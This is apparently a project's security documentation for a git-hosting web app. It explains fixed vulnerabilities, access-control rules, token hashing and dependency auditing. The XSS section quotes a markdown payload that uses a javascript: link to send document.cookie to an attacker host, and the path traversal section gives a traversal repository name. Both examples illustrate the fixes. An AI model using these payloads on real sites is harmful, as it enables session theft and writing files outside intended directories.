# Security

This document covers the security model and specific invariants that have to
hold — most of them were established after concrete vulnerabilities were
found and fixed, so the "why" matters as much as the rule.

## Access control

See [authentication.md](./authentication.md) for the full model. The one rule
worth repeating here: `repo-access.ts` is the **only** place that computes
whether a user can read/write/moderate a repository. Any new handler that
touches repository data must call through it (`requireReadAccess`,
`requireWriteAccess`, `getRepoWithReadAccess`, etc.) rather than re-deriving
the answer — a hand-rolled check is a place a future edit can silently get the
logic wrong (e.g. forgetting the "public + anonymous = readable" case, or the
distinction between a write collaborator and the owner for owner-only
actions).

## Stored XSS in markdown rendering

`MarkdownRenderer` (`src/components/MarkdownRenderer.tsx`) renders content
that is **fully attacker-controlled**: issue bodies, PR bodies, comments, and
README files — anyone with write access to a repo (or, for a public repo,
anyone who can comment) can put arbitrary markdown in front of anyone who
views that content.

The link/image renderer used to render a raw `<a href={href}>`/`<img
src={src}>` for any href/src that didn't match a known "external" pattern and
wasn't a recognized internal repo-reference link — reachable specifically when
no `branch` context was available, which is exactly the case for issue/PR/
comment bodies (they're rendered without a `branch` prop, only with `owner`/
`name`). A comment containing `[click me](javascript:fetch('https://evil.example/steal?c='+document.cookie))`
would render as a live `javascript:` link, executing in the viewer's
authenticated session on click.

**Fix**: `isSafeHref`/`isSafeImageSrc` gate every href/src before it reaches
a real DOM attribute. The rule is an **allowlist**, not a blocklist — schemeless
(relative) hrefs are safe by construction, and an explicit scheme is only
allowed if it's `http:`, `https:`, or `mailto:` (images additionally allow
`data:image/...` specifically, since an `<img src="data:...">` can't execute
script the way an `<a href="data:text/html,...">` navigation could). Anything
else — `javascript:`, `vbscript:`, `data:text/html`, whatever comes next — is
rejected by construction rather than requiring the blocklist to be kept
up to date.

**If you touch this component**: any new place that renders a user-controlled
href/src as a real attribute must go through these same two functions. Don't
reintroduce a raw `<a href={href}>` fallback "just for this one case" without
the check — that's exactly how the original bug existed.

## Path traversal via repository name

`repositories.ts`'s `createRepository`/`updateRepository` used to validate the
repo `name` field with only `z.string().min(1).max(100)` — no character
restriction at all. That name flows, eventually, into
`getRepoPath(ownerKey, repoName)` (`git-manager-iso.ts`), which does a real
`path.join(GIT_BASE_PATH, ownerKey, repoName)` for local-disk write hydration
(see [git-storage.md](./git-storage.md)). `path.join` resolves `..`
components — a repository named `..`, or (in the non-R2 / local-disk-only
deployment mode) something like `../../../etc/cron.d/x`, could write bare-repo
files (`HEAD`, `config`, `objects/`, `refs/`) outside the intended storage
root.

**Fix, at three layers** (defense in depth — don't remove any one layer on the
assumption another covers it):

1. **Input validation** — `repositories.ts`'s `repoNameSchema` restricts names
   to `/^[a-zA-Z0-9](?:[a-zA-Z0-9._-]*[a-zA-Z0-9])?$/`: must start/end with an
   alphanumeric, no `/`/`\`, and — because it must start and end with an
   alphanumeric — can never be `.` or `..` on its own.
2. **`sanitizeStorageSegment`** (`git-storage-naming.ts`) — used everywhere a
   storage-key segment is built from a username or repo name. Replaces
   `/`/`\` and whitespace with `-`, and additionally collapses a segment that
   is *exactly* `.` or `..` to `_` (slash-replacement alone doesn't touch a
   bare `..`, since there's no slash to replace).
3. **`getRepoPath` itself** (`git-manager-iso.ts`) — re-sanitizes both
   `ownerKey` and `repoName` via `sanitizeStorageSegment`, then verifies with
   `path.resolve` that the result is actually contained under
   `GIT_BASE_PATH` before returning it, throwing rather than silently
   returning an escaped path. This exists specifically so a caller that
   forgot to pre-sanitize (or a future code path that introduces a new way to
   reach this function) can't reintroduce the vulnerability by omission.

R2 keys built from an unsanitized segment are lower-risk on their own (S3 has
no path resolution — `"repos/x/../y"` is just a literal, harmless string key,
not a traversal), but the local-disk hydration path that every write
operation goes through, R2-configured or not, is real Node.js `path.join`
against a real filesystem, and that's where this actually bites.

## Personal Access Tokens

PATs are stored as a SHA-256 hash (`tokens.tokenHash`), never in plaintext.
This is the correct approach specifically because PATs are high-entropy random
strings — unlike password hashing (which needs a slow, salted algorithm like
bcrypt/argon2 to resist brute-forcing low-entropy human passwords), a fast
hash is fine for a token that's already unguessable. See
[authentication.md](./authentication.md) for the full auth-fallback chain.

## Secrets

`BETTER_AUTH_SECRET` must never be reachable from client-bundled code — see
[authentication.md](./authentication.md)'s note on `auth-session.ts`'s dynamic
import. No credential (password, PAT, session cookie) is ever passed to
`console.log`/`console.error` anywhere in the auth paths — only generic
"auth failed" messages are logged.

## Dependency vulnerabilities

`pnpm audit` will show a large number of findings in this project — as of the
last audit, all of them trace through dev-only tooling (`wrangler`/`miniflare`
pulled in transitively by `@cloudflare/vite-plugin`, which per
[deployment.md](./deployment.md) is a dependency but not actually wired into
the Vite config; and `prisma`'s own dev-server tooling nested oddly under
`drizzle-orm`/`better-auth`'s dependency tree) — none reachable from the
actual deployed runtime. Re-verify this reasoning (don't just assume it still
holds) before dismissing a new audit finding the same way; check the
`findings[].paths` in `pnpm audit --json` to see whether a given advisory's
dependency chain is genuinely dev-only or has since become part of a real
runtime path.

## A known, separate issue (not a vulnerability, but worth knowing)

Blob routes for files ending in `.md` (e.g. viewing a `README.md` through the
blob viewer) currently 404 before ever reaching the app's own router — the
Vercel-dev-emulation layer appears to treat `.md` as a static-asset extension
and short-circuits the request. This looks like it would also break in a real
deployment, not just local dev. Not a security issue, but flagged here since
it was discovered during a security/performance audit and hasn't been
root-caused yet.
